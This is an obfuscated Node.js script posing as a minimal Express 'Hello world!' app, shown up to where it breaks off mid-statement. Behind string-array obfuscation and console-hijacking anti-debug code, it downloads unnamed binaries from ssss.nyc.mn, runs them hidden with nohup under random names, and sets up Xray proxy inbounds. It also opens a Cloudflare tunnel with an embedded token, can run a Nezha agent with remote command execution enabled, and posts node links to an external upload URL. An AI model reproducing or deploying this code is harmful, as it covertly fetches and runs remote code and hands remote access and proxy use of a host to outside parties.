const _0x5a2192=_0x2f7d;(function(_0x41435f,_0xe54fb3){const _0x1489db=_0x2f7d,_0x5c0b00=_0x41435f();while(!![]){try{const _0x538222=-parseInt(_0x1489db(0x227))/0x1*(-parseInt(_0x1489db(0x16b))/0x2)+parseInt(_0x1489db(0x1d6))/0x3*(parseInt(_0x1489db(0x1f6))/0x4)+-parseInt(_0x1489db(0x223))/0x5+parseInt(_0x1489db(0x16e))/0x6*(parseInt(_0x1489db(0x1bd))/0x7)+-parseInt(_0x1489db(0x1b1))/0x8+-parseInt(_0x1489db(0x195))/0x9+parseInt(_0x1489db(0x19a))/0xa;if(_0x538222===_0xe54fb3)break;else _0x5c0b00['push'](_0x5c0b00['shift']());}catch(_0x4c48dc){_0x5c0b00['push'](_0x5c0b00['shift']());}}}(_0x27c1,0x2071d));const _0x59bac6=(function(){let _0x254a0a=!![];return function(_0x289253,_0x4cfddf){const _0x1b3269=_0x254a0a?function(){const _0x5a7c6a=_0x2f7d;if(_0x4cfddf){const _0x1bca12=_0x4cfddf[_0x5a7c6a(0x17c)](_0x289253,arguments);return _0x4cfddf=null,_0x1bca12;}}:function(){};return _0x254a0a=![],_0x1b3269;};}()),_0x5a980d=_0x59bac6(this,function(){const _0x9174a7=_0x2f7d;return _0x5a980d[_0x9174a7(0x189)]()['search'](_0x9174a7(0x1d1))[_0x9174a7(0x189)]()[_0x9174a7(0x165)](_0x5a980d)[_0x9174a7(0x1f7)]('(((.+)+)+)+$');});function _0x27c1(){const _0x39f5d4=['basename','has','push','52534VVENGA','tunnel.yml','Subscription\x20uploaded\x20successfully','fileName','Hello\x20world!','automatic\x20access\x20task\x20added\x20successfully','vmess','\x20is\x20running','unlinkSync','console','\x20>/dev/null\x202>&1\x20&','pipe','includes','constructor','Error\x20executing\x20command:\x20','php\x20running\x20error:\x20','config.yaml','cdns.doon.eu.org','random','6vEJngn','AUTO_ACCESS','match','1278EgHOne','\x0a\x20\x20\x20\x20','unlink','Empowerment\x20success\x20for\x20','&fp=firefox&type=ws&host=','\x22\x20>\x20/dev/null\x202>&1','Nodes\x20uploaded\x20successfully','warn','https+local://8.8.8.8/dns-query','\x20failed:\x20','127.0.0.1','\x20-s\x20','\x20>/dev/null\x202>&1','status','apply','post','child_process','http\x20server\x20is\x20running\x20on\x20port:','info','Skipping\x20adding\x20automatic\x20access\x20task','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','sub.txt','\x0a\x20\x20credentials-file:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','ArgoDomain:','2087','443','toString','xray1.900809.xyz','response','quic','data','/vless-argo','CFIP','split','statSync','/api/add-nodes','isFile','./tmp','797292SvIFBA','stream','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','win32','filter','219550DvBOpQ','createWriteStream','App\x20is\x20running','prototype','message','stringify','Add\x20automatic\x20access\x20task\x20faild:\x20','NEZHA_KEY','exec','join','unshift','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','platform','length','2053','\x20is\x20created','\x20-c\x20','get','2096','trojan','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','ARGO_PORT','utf-8','871632caTbTg','log','none','error','readFileSync','config.json','countryCode','finish','send','vless','express','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','4781mcKkdP','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','bind','exception','ARGO_AUTH','http','FILE_PATH','/config.json\x20>/dev/null\x202>&1\x20&','Content-Type','\x20-c\x20\x22','env','/tunnel.yml\x20run','all','Error\x20reading\x20boot.log:','fileUrl','application/json','Unknown','https://amd64.ssss.nyc.mn/v1','2083','/trojan-argo','(((.+)+)+)+$','direct','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','mkdirSync','\x20already\x20exists','93QYMRdk','\x20>\x20nul\x202>&1','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','axios','path','8443','block','UUID','SERVER_PORT','NEZHA\x20variable\x20is\x20empty,skip\x20running','org','eyJhIjoiMTZjZjVkMzQwODQ2YmU1MDNlYWQzNjY2NTI4MDczNTMiLCJ0IjoiZGI1NTBlMDAtZTE2Yy00OWQ0LTllM2UtYjNjYTM2MzkwMjY3IiwicyI6Ik5UZzFZMll6T0RBdE5XUmhNUzAwWldWa0xUazJNV1l0TWpKaVpESXlabUl6WVdRdyJ9','Error\x20downloading\x20files:','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','https://arm64.ssss.nyc.mn/agent','ARGO_DOMAIN:','Error\x20in\x20startserver:','/api/delete-nodes','pop','catch','aarch64','?encryption=none&security=tls&sni=','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','firefox','SUB_PATH','PROJECT_URL','country_code','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/dev/null','npm\x20running\x20error:\x20','trace','false','30004oHYYmJ','search','https://arm64.ssss.nyc.mn/web','forEach','\x20-p\x20','xtls-rprx-vision','substring','tls','tunnel.json','test','\x20successfully','list.txt','from','&path=%2Fvless-argo%3Fed%3D2560#','util','rm\x20-rf\x20','pkill\x20-f\x20\x22[','NAME','clear','https://arm64.ssss.nyc.mn/bot','del\x20/f\x20/q\x20','taskkill\x20/f\x20/im\x20','UPLOAD_URL','base64','\x0a\x20\x20tunnel:\x20','writeFileSync','https://amd64.ssss.nyc.mn/web','freedom','https://arm64.ssss.nyc.mn/v1','Download\x20','charAt','/vmess-argo','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','close','existsSync','/sub.txt\x20saved\x20successfully','\x0aclient_secret:\x20','tcp','boot.log','PORT','nohup\x20','/api/add-subscriptions','text/plain;\x20charset=utf-8','arm','readdirSync','1135660UNBliv'];_0x27c1=function(){return _0x39f5d4;};return _0x27c1();}_0x5a980d();const _0xf8e23b=(function(){let _0x349ad8=!![];return function(_0x3dfd95,_0x4c833f){const _0x5ad2bf=_0x349ad8?function(){if(_0x4c833f){const _0x25c731=_0x4c833f['apply'](_0x3dfd95,arguments);return _0x4c833f=null,_0x25c731;}}:function(){};return _0x349ad8=![],_0x5ad2bf;};}()),_0x34ae26=_0xf8e23b(this,function(){const _0x94ca54=_0x2f7d,_0x308f81=function(){let _0x2ac07f;try{_0x2ac07f=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x1ef144){_0x2ac07f=window;}return _0x2ac07f;},_0x32c9b9=_0x308f81(),_0x4edb23=_0x32c9b9[_0x94ca54(0x161)]=_0x32c9b9[_0x94ca54(0x161)]||{},_0x5335c0=[_0x94ca54(0x1b2),_0x94ca54(0x175),_0x94ca54(0x180),'error',_0x94ca54(0x1c0),'table',_0x94ca54(0x1f4)];for(let _0x5c57c8=0x0;_0x5c57c8<_0x5335c0[_0x94ca54(0x1a7)];_0x5c57c8++){const _0x364973=_0xf8e23b[_0x94ca54(0x165)][_0x94ca54(0x19d)][_0x94ca54(0x1bf)](_0xf8e23b),_0x186910=_0x5335c0[_0x5c57c8],_0x4d372c=_0x4edb23[_0x186910]||_0x364973;_0x364973['__proto__']=_0xf8e23b['bind'](_0xf8e23b),_0x364973[_0x94ca54(0x189)]=_0x4d372c[_0x94ca54(0x189)]['bind'](_0x4d372c),_0x4edb23[_0x186910]=_0x364973;}});_0x34ae26();const express=require(_0x5a2192(0x1bb)),app=express(),axios=require(_0x5a2192(0x1d9)),os=require('os'),fs=require('fs'),path=require(_0x5a2192(0x1da)),{promisify}=require(_0x5a2192(0x204)),exec=promisify(require('child_process')[_0x5a2192(0x1a2)]),{execSync}=require(_0x5a2192(0x17e)),UPLOAD_URL=process[_0x5a2192(0x1c7)][_0x5a2192(0x20c)]||'',PROJECT_URL=process[_0x5a2192(0x1c7)][_0x5a2192(0x1ef)]||'',AUTO_ACCESS=process[_0x5a2192(0x1c7)][_0x5a2192(0x16c)]||![],FILE_PATH=process[_0x5a2192(0x1c7)][_0x5a2192(0x1c3)]||_0x5a2192(0x194),SUB_PATH=process['env'][_0x5a2192(0x1ee)]||'xujq',PORT=process[_0x5a2192(0x1c7)][_0x5a2192(0x1de)]||process[_0x5a2192(0x1c7)][_0x5a2192(0x21d)]||0xbb8,UUID=process[_0x5a2192(0x1c7)][_0x5a2192(0x1dd)]||'197c869d-cf8f-4547-95fe-e38dd26525d8',NEZHA_SERVER=process[_0x5a2192(0x1c7)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x5a2192(0x1a1)]||'',ARGO_DOMAIN=process[_0x5a2192(0x1c7)]['ARGO_DOMAIN']||_0x5a2192(0x18a),ARGO_AUTH=process[_0x5a2192(0x1c7)][_0x5a2192(0x1c1)]||_0x5a2192(0x1e1),ARGO_PORT=process[_0x5a2192(0x1c7)][_0x5a2192(0x1af)]||0x1f41,CFIP=process[_0x5a2192(0x1c7)][_0x5a2192(0x18f)]||_0x5a2192(0x169),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x5a2192(0x1c7)][_0x5a2192(0x207)]||'';!fs[_0x5a2192(0x218)](FILE_PATH)?(fs[_0x5a2192(0x1d4)](FILE_PATH),console[_0x5a2192(0x1b2)](FILE_PATH+_0x5a2192(0x1a9))):console['log'](FILE_PATH+_0x5a2192(0x1d5));function _0x2f7d(_0x3be00c,_0xce8c3c){const _0x2fc958=_0x27c1();return _0x2f7d=function(_0x34ae26,_0xf8e23b){_0x34ae26=_0x34ae26-0x15f;let _0x32652f=_0x2fc958[_0x34ae26];return _0x32652f;},_0x2f7d(_0x3be00c,_0xce8c3c);}function generateRandomName(){const _0x34e609=_0x5a2192,_0x2c0b67='abcdefghijklmnopqrstuvwxyz';let _0x357ae5='';for(let _0x45a253=0x0;_0x45a253<0x6;_0x45a253++){_0x357ae5+=_0x2c0b67[_0x34e609(0x214)](Math['floor'](Math[_0x34e609(0x16a)]()*_0x2c0b67[_0x34e609(0x1a7)]));}return _0x357ae5;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x5a2192(0x1a3)](FILE_PATH,npmName),phpPath=path[_0x5a2192(0x1a3)](FILE_PATH,phpName),webPath=path[_0x5a2192(0x1a3)](FILE_PATH,webName),botPath=path[_0x5a2192(0x1a3)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x5a2192(0x183)),listPath=path['join'](FILE_PATH,_0x5a2192(0x201)),bootLogPath=path[_0x5a2192(0x1a3)](FILE_PATH,_0x5a2192(0x21c)),configPath=path['join'](FILE_PATH,_0x5a2192(0x1b6));function deleteNodes(){const _0x332f18=_0x5a2192;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x2a8150;try{_0x2a8150=fs['readFileSync'](subPath,_0x332f18(0x1b0));}catch{return null;}const _0x7f08b4=Buffer[_0x332f18(0x202)](_0x2a8150,_0x332f18(0x20d))[_0x332f18(0x189)](_0x332f18(0x1b0)),_0x40a5e4=_0x7f08b4[_0x332f18(0x190)]('\x0a')[_0x332f18(0x199)](_0x56b6a5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x332f18(0x1ff)](_0x56b6a5));if(_0x40a5e4['length']===0x0)return;return axios[_0x332f18(0x17d)](UPLOAD_URL+_0x332f18(0x1e7),JSON[_0x332f18(0x19f)]({'nodes':_0x40a5e4}),{'headers':{'Content-Type':'application/json'}})[_0x332f18(0x1e9)](_0x107cb1=>{return null;}),null;}catch(_0x1985af){return null;}}function cleanupOldFiles(){const _0xb89d83=_0x5a2192;try{const _0x4c4997=fs[_0xb89d83(0x222)](FILE_PATH);_0x4c4997[_0xb89d83(0x1f9)](_0x49e785=>{const _0x1c450b=_0xb89d83,_0x82b334=path[_0x1c450b(0x1a3)](FILE_PATH,_0x49e785);try{const _0x491f4c=fs[_0x1c450b(0x191)](_0x82b334);_0x491f4c[_0x1c450b(0x193)]()&&fs['unlinkSync'](_0x82b334);}catch(_0x2dabfc){}});}catch(_0x259a6d){}}app['get']('/',function(_0x142763,_0x446b69){const _0x41ab9c=_0x5a2192;_0x446b69[_0x41ab9c(0x1b9)](_0x41ab9c(0x22b));});async function generateConfig(){const _0x3d680e=_0x5a2192,_0x5aa152={'log':{'access':_0x3d680e(0x1f2),'error':_0x3d680e(0x1f2),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3d680e(0x1ba),'settings':{'clients':[{'id':UUID,'flow':_0x3d680e(0x1fb)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x3d680e(0x18e),'dest':0xbba},{'path':_0x3d680e(0x215),'dest':0xbbb},{'path':_0x3d680e(0x1d0),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x3d680e(0x178),'protocol':_0x3d680e(0x1ba),'settings':{'clients':[{'id':UUID}],'decryption':_0x3d680e(0x1b3)},'streamSettings':{'network':_0x3d680e(0x21b),'security':_0x3d680e(0x1b3)}},{'port':0xbba,'listen':_0x3d680e(0x178),'protocol':_0x3d680e(0x1ba),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3d680e(0x1b3)},'streamSettings':{'network':'ws','security':_0x3d680e(0x1b3),'wsSettings':{'path':_0x3d680e(0x18e)}},'sniffing':{'enabled':!![],'destOverride':[_0x3d680e(0x1c2),_0x3d680e(0x1fd),_0x3d680e(0x18c)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3d680e(0x178),'protocol':_0x3d680e(0x22d),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x3d680e(0x1c2),_0x3d680e(0x1fd),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3d680e(0x178),'protocol':_0x3d680e(0x1ad),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3d680e(0x1b3),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x3d680e(0x1c2),_0x3d680e(0x1fd),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x3d680e(0x176)]},'outbounds':[{'protocol':_0x3d680e(0x211),'tag':_0x3d680e(0x1d2)},{'protocol':'blackhole','tag':_0x3d680e(0x1dc)}]};fs['writeFileSync'](path[_0x3d680e(0x1a3)](FILE_PATH,_0x3d680e(0x1b6)),JSON['stringify'](_0x5aa152,null,0x2));}function getSystemArchitecture(){const _0x28c563=_0x5a2192,_0x4750b2=os['arch']();return _0x4750b2===_0x28c563(0x221)||_0x4750b2==='arm64'||_0x4750b2===_0x28c563(0x1ea)?_0x28c563(0x221):'amd';}function downloadFile(_0x596a48,_0x39056c,_0x1bb3f2){const _0x18bd70=_0x5a2192,_0x14b500=_0x596a48;!fs[_0x18bd70(0x218)](FILE_PATH)&&fs[_0x18bd70(0x1d4)](FILE_PATH,{'recursive':!![]});const _0x57cd88=fs[_0x18bd70(0x19b)](_0x14b500);axios({'method':_0x18bd70(0x1ab),'url':_0x39056c,'responseType':_0x18bd70(0x196)})['then'](_0x407c0e=>{const _0x301055=_0x18bd70;_0x407c0e['data'][_0x301055(0x163)](_0x57cd88),_0x57cd88['on'](_0x301055(0x1b8),()=>{const _0x3545c6=_0x301055;_0x57cd88[_0x3545c6(0x217)](),console[_0x3545c6(0x1b2)](_0x3545c6(0x213)+path['basename'](_0x14b500)+_0x3545c6(0x200)),_0x1bb3f2(null,_0x14b500);}),_0x57cd88['on']('error',_0x3c6500=>{const _0x451665=_0x301055;fs[_0x451665(0x170)](_0x14b500,()=>{});const _0x382ca2='Download\x20'+path[_0x451665(0x224)](_0x14b500)+'\x20failed:\x20'+_0x3c6500[_0x451665(0x19e)];console[_0x451665(0x1b4)](_0x382ca2),_0x1bb3f2(_0x382ca2);});})['catch'](_0x147ea2=>{const _0x28544c=_0x18bd70,_0x2be60e=_0x28544c(0x213)+path[_0x28544c(0x224)](_0x14b500)+_0x28544c(0x177)+_0x147ea2[_0x28544c(0x19e)];console[_0x28544c(0x1b4)](_0x2be60e),_0x1bb3f2(_0x2be60e);});}async function downloadFilesAndRun(){const _0x33317e=_0x5a2192,_0xb9a05=getSystemArchitecture(),_0x1d3a98=getFilesForArchitecture(_0xb9a05);if(_0x1d3a98['length']===0x0){console[_0x33317e(0x1b2)](_0x33317e(0x1ae));return;}const _0x275c02=_0x1d3a98['map'](_0x5e65c5=>{return new Promise((_0x21e25c,_0x2619bf)=>{const _0x132ff2=_0x2f7d;downloadFile(_0x5e65c5[_0x132ff2(0x22a)],_0x5e65c5[_0x132ff2(0x1cb)],(_0x5452ed,_0x7f08be)=>{_0x5452ed?_0x2619bf(_0x5452ed):_0x21e25c(_0x7f08be);});});});try{await Promise[_0x33317e(0x1c9)](_0x275c02);}catch(_0x7ff33){console[_0x33317e(0x1b4)](_0x33317e(0x1e2),_0x7ff33);return;}function _0x5b32a5(_0x4fdbfa){const _0x1d51ef=_0x33317e,_0x38d815=0x1fd;_0x4fdbfa[_0x1d51ef(0x1f9)](_0x19c9f7=>{const _0x237107=_0x1d51ef;fs[_0x237107(0x218)](_0x19c9f7)&&fs['chmod'](_0x19c9f7,_0x38d815,_0x312c1d=>{const _0x14fb2b=_0x237107;_0x312c1d?console[_0x14fb2b(0x1b4)]('Empowerment\x20failed\x20for\x20'+_0x19c9f7+':\x20'+_0x312c1d):console[_0x14fb2b(0x1b2)](_0x14fb2b(0x171)+_0x19c9f7+':\x20'+_0x38d815['toString'](0x8));});});}const _0x4ec6e9=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5b32a5(_0x4ec6e9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x9c0cbb=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x33317e(0x190)](':')[_0x33317e(0x1e8)]():'',_0x2762ee=new Set([_0x33317e(0x188),'8443','2096',_0x33317e(0x187),_0x33317e(0x1cf),_0x33317e(0x1a8)]),_0x1b97e5=_0x2762ee[_0x33317e(0x225)](_0x9c0cbb)?'true':_0x33317e(0x1f5),_0x3871fb=_0x33317e(0x21a)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x1b97e5+_0x33317e(0x1ec)+UUID;fs[_0x33317e(0x20f)](path['join'](FILE_PATH,_0x33317e(0x168)),_0x3871fb);const _0x44d243=_0x33317e(0x21e)+phpPath+_0x33317e(0x1c6)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x44d243),console[_0x33317e(0x1b2)](phpName+'\x20is\x20running'),await new Promise(_0x58af8a=>setTimeout(_0x58af8a,0x3e8));}catch(_0x174b8d){console[_0x33317e(0x1b4)](_0x33317e(0x167)+_0x174b8d);}}else{let _0x914993='';const _0x21795f=[_0x33317e(0x188),_0x33317e(0x1db),_0x33317e(0x1ac),_0x33317e(0x187),'2083',_0x33317e(0x1a8)];_0x21795f[_0x33317e(0x164)](NEZHA_PORT)&&(_0x914993='--tls');const _0x277f43='nohup\x20'+npmPath+_0x33317e(0x179)+NEZHA_SERVER+':'+NEZHA_PORT+_0x33317e(0x1fa)+NEZHA_KEY+'\x20'+_0x914993+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x277f43),console['log'](npmName+'\x20is\x20running'),await new Promise(_0xdea0b8=>setTimeout(_0xdea0b8,0x3e8));}catch(_0x470675){console[_0x33317e(0x1b4)](_0x33317e(0x1f3)+_0x470675);}}}else console['log'](_0x33317e(0x1df));const _0x3adda7='nohup\x20'+webPath+_0x33317e(0x1aa)+FILE_PATH+_0x33317e(0x1c4);try{await exec(_0x3adda7),console['log'](webName+'\x20is\x20running'),await new Promise(_0x125452=>setTimeout(_0x125452,0x3e8));}catch(_0x11655b){console[_0x33317e(0x1b4)]('web\x20running\x20error:\x20'+_0x11655b);}if(fs[_0x33317e(0x218)](botPath)){let _0x5dc268;if(ARGO_AUTH[_0x33317e(0x16d)](/^[A-Z0-9a-z=]{120,250}$/))_0x5dc268=_0x33317e(0x197)+ARGO_AUTH;else ARGO_AUTH[_0x33317e(0x16d)](/TunnelSecret/)?_0x5dc268=_0x33317e(0x1d3)+FILE_PATH+_0x33317e(0x1c8):_0x5dc268=_0x33317e(0x185)+FILE_PATH+_0x33317e(0x182)+ARGO_PORT;try{await exec(_0x33317e(0x21e)+botPath+'\x20'+_0x5dc268+_0x33317e(0x162)),console[_0x33317e(0x1b2)](botName+_0x33317e(0x15f)),await new Promise(_0x49b4d4=>setTimeout(_0x49b4d4,0x7d0));}catch(_0x12eba3){console[_0x33317e(0x1b4)](_0x33317e(0x166)+_0x12eba3);}}await new Promise(_0x38883d=>setTimeout(_0x38883d,0x1388));}function getFilesForArchitecture(_0x3142db){const _0x238593=_0x5a2192;let _0x33e74a;_0x3142db===_0x238593(0x221)?_0x33e74a=[{'fileName':webPath,'fileUrl':_0x238593(0x1f8)},{'fileName':botPath,'fileUrl':_0x238593(0x209)}]:_0x33e74a=[{'fileName':webPath,'fileUrl':_0x238593(0x210)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4429da=_0x3142db===_0x238593(0x221)?_0x238593(0x1e4):'https://amd64.ssss.nyc.mn/agent';_0x33e74a[_0x238593(0x1a4)]({'fileName':npmPath,'fileUrl':_0x4429da});}else{const _0x4a7a3d=_0x3142db===_0x238593(0x221)?_0x238593(0x212):_0x238593(0x1ce);_0x33e74a['unshift']({'fileName':phpPath,'fileUrl':_0x4a7a3d});}}return _0x33e74a;}function argoType(){const _0x80686e=_0x5a2192;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x80686e(0x1b2)](_0x80686e(0x1e3));return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs[_0x80686e(0x20f)](path[_0x80686e(0x1a3)](FILE_PATH,_0x80686e(0x1fe)),ARGO_AUTH);const _0x519c19=_0x80686e(0x20e)+ARGO_AUTH['split']('\x22')[0xb]+_0x80686e(0x184)+path[_0x80686e(0x1a3)](FILE_PATH,_0x80686e(0x1fe))+_0x80686e(0x1be)+ARGO_DOMAIN+_0x80686e(0x1bc)+ARGO_PORT+_0x80686e(0x1a5);fs[_0x80686e(0x20f)](path[_0x80686e(0x1a3)](FILE_PATH,_0x80686e(0x228)),_0x519c19);}else console[_0x80686e(0x1b2)](_0x80686e(0x1f1));}async function extractDomains(){const _0x5daa95=_0x5a2192;let _0x1a0637;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1a0637=ARGO_DOMAIN,console[_0x5daa95(0x1b2)](_0x5daa95(0x1e5),_0x1a0637),await _0x90fd88(_0x1a0637);else try{const _0x5a97a7=fs[_0x5daa95(0x1b5)](path['join'](FILE_PATH,_0x5daa95(0x21c)),_0x5daa95(0x1b0)),_0x16f5cd=_0x5a97a7[_0x5daa95(0x190)]('\x0a'),_0x274a92=[];_0x16f5cd[_0x5daa95(0x1f9)](_0x409647=>{const _0x188bd5=_0x5daa95,_0x74c1fd=_0x409647[_0x188bd5(0x16d)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x74c1fd){const _0x224019=_0x74c1fd[0x1];_0x274a92[_0x188bd5(0x226)](_0x224019);}});if(_0x274a92[_0x5daa95(0x1a7)]>0x0)_0x1a0637=_0x274a92[0x0],console[_0x5daa95(0x1b2)](_0x5daa95(0x186),_0x1a0637),await _0x90fd88(_0x1a0637);else{console['log'](_0x5daa95(0x1d8)),fs[_0x5daa95(0x160)](path[_0x5daa95(0x1a3)](FILE_PATH,_0x5daa95(0x21c)));async function _0x520bc3(){const _0x1cbb90=_0x5daa95;try{process[_0x1cbb90(0x1a6)]===_0x1cbb90(0x198)?await exec(_0x1cbb90(0x20b)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x1cbb90(0x206)+botName[_0x1cbb90(0x214)](0x0)+']'+botName[_0x1cbb90(0x1fc)](0x1)+_0x1cbb90(0x173));}catch(_0x5aef83){}}_0x520bc3(),await new Promise(_0x3c4449=>setTimeout(_0x3c4449,0xbb8));const _0x1d4bf9=_0x5daa95(0x185)+FILE_PATH+_0x5daa95(0x182)+ARGO_PORT;try{await exec(_0x5daa95(0x21e)+botPath+'\x20'+_0x1d4bf9+_0x5daa95(0x162)),console[_0x5daa95(0x1b2)](botName+'\x20is\x20running'),await new Promise(_0x2bc520=>setTimeout(_0x2bc520,0xbb8)),await extractDomains();}catch(_0x86f75d){console[_0x5daa95(0x1b4)](_0x5daa95(0x166)+_0x86f75d);}}}catch(_0x27d8bc){console[_0x5daa95(0x1b4)](_0x5daa95(0x1ca),_0x27d8bc);}async function _0x1d05fb(){const _0x3510cb=_0x5daa95;try{const _0xc0c302=await axios[_0x3510cb(0x1ab)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0xc0c302[_0x3510cb(0x18d)]&&_0xc0c302[_0x3510cb(0x18d)][_0x3510cb(0x1f0)]&&_0xc0c302['data'][_0x3510cb(0x1e0)])return _0xc0c302[_0x3510cb(0x18d)]['country_code']+'_'+_0xc0c302[_0x3510cb(0x18d)][_0x3510cb(0x1e0)];}catch(_0xe8f2f5){try{const _0x290685=await axios[_0x3510cb(0x1ab)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x290685[_0x3510cb(0x18d)]&&_0x290685[_0x3510cb(0x18d)][_0x3510cb(0x17b)]==='success'&&_0x290685[_0x3510cb(0x18d)][_0x3510cb(0x1b7)]&&_0x290685[_0x3510cb(0x18d)]['org'])return _0x290685[_0x3510cb(0x18d)][_0x3510cb(0x1b7)]+'_'+_0x290685['data']['org'];}catch(_0xbd9a79){}}return _0x3510cb(0x1cd);}async function _0x90fd88(_0x2df895){const _0x50cdcf=await _0x1d05fb(),_0x4b03eb=NAME?NAME+'-'+_0x50cdcf:_0x50cdcf;return new Promise(_0x26a065=>{setTimeout(()=>{const _0x1144ac=_0x2f7d,_0x10440a={'v':'2','ps':''+_0x4b03eb,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x2df895,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x2df895,'alpn':'','fp':_0x1144ac(0x1ed)},_0x245f31='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x1144ac(0x1eb)+_0x2df895+_0x1144ac(0x172)+_0x2df895+_0x1144ac(0x203)+_0x4b03eb+'\x0a\x0avmess://'+Buffer[_0x1144ac(0x202)](JSON[_0x1144ac(0x19f)](_0x10440a))[_0x1144ac(0x189)](_0x1144ac(0x20d))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x2df895+'&fp=firefox&type=ws&host='+_0x2df895+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x4b03eb+_0x1144ac(0x16f);console[_0x1144ac(0x1b2)](Buffer[_0x1144ac(0x202)](_0x245f31)[_0x1144ac(0x189)](_0x1144ac(0x20d))),fs[_0x1144ac(0x20f)](subPath,Buffer[_0x1144ac(0x202)](_0x245f31)[_0x1144ac(0x189)](_0x1144ac(0x20d))),console['log'](FILE_PATH+_0x1144ac(0x219)),uploadNodes(),app[_0x1144ac(0x1ab)]('/'+SUB_PATH,(_0x5bcf79,_0x33dec8)=>{const _0x560a77=_0x1144ac,_0x579bba=Buffer[_0x560a77(0x202)](_0x245f31)[_0x560a77(0x189)]('base64');_0x33dec8['set'](_0x560a77(0x1c5),_0x560a77(0x220)),_0x33dec8[_0x560a77(0x1b9)](_0x579bba);}),_0x26a065(_0x245f31);},0x7d0);});}}async function uploadNodes(){const _0x11f78d=_0x5a2192;if(UPLOAD_URL&&PROJECT_URL){const _0x423c98=PROJECT_URL+'/'+SUB_PATH,_0x18f45e={'subscription':[_0x423c98]};try{const _0x4c8350=await axios['post'](UPLOAD_URL+_0x11f78d(0x21f),_0x18f45e,{'headers':{'Content-Type':_0x11f78d(0x1cc)}});return _0x4c8350&&_0x4c8350[_0x11f78d(0x17b)]===0xc8?(console[_0x11f78d(0x1b2)](_0x11f78d(0x229)),_0x4c8350):null;}catch(_0x3b788b){if(_0x3b788b['response']){if(_0x3b788b[_0x11f78d(0x18b)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0xf82b66=fs[_0x11f78d(0x1b5)](listPath,_0x11f78d(0x1b0)),_0x104cb7=_0xf82b66['split']('\x0a')[_0x11f78d(0x199)](_0x17900a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x17900a));if(_0x104cb7[_0x11f78d(0x1a7)]===0x0)return;const 